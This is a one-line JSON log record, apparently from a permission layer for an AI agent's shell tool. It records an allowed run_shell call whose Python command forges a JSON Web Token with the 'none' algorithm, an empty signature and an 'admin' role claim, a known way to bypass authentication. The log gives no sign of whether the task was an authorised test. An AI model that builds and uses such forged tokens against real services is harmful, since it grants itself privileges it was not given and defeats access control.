{"ts": 1790691585.806991, "decision_id": "580b9d14b7ce", "tool": "run_shell", "allow": true, "reason": null, "target": "python3 -c \"\nimport base64\nimport json\n\n# Header with alg=none\nheader = {'alg': 'none', 'typ': 'JWT'}\n# Payload with admin role\npayload = {'role': 'admin', 'sub': 'testuser', 'iat': 1700000000, 'exp': 1800000000}\n\n# Encode header and payload (no signature for 'none' algorithm)\nheader_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')\npayload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')\n\n# For 'none' algorithm, signature is empty\ntoken = f'{header_b64}.{payload_b64}.'\nprint(token)\n\""}
